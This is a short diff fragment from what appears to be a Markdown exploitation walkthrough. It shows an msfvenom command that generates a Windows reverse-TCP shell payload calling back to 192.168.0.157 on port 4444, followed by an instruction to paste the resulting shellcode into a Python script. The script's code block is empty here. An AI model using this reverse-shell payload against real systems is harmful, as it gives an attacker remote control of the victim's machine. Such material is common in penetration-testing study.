@@ -14,3 +14,9 @@ msfvenom -p windows/shell_reverse_tcp LHOST=192.168.0.157 LPORT=4444 EXITFUNC=th
 - Paste this command into your terminal and you should get a payload
 
 ![](https://i.imgur.com/fTp8ZvG.png)
+
+Now insert this payload into this python script replacing the value of the variable `shellcode` with the payload 
+
+```python
+
+```
